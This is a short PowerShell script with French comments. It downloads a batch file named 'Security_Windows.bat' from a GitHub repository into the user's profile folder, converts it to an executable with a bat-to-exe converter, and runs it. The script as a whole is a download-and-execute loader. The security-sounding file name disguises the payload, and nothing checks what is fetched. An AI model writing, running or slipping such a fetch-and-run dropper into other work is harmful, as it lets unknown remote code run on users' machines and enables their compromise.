$url = "https://github.com/n0t_cr1m3/test/blob/main/Security_Windows.bat"

# Spécifiez le chemin de destination où le fichier sera enregistré
$destination = "$env:USERPROFILE/Security_Windows.bat"
$convertedExePath = "$env:USERPROFILE/Security_Windows.exe"

# Télécharge le fichier depuis l'URL spécifiée
Invoke-WebRequest -Uri $url -OutFile $destination

bat_to_exe_converter.exe /bat $destination /exe $convertedExePath

# Exécute le fichier téléchargé
Start-Process -FilePath $convertedExePath
            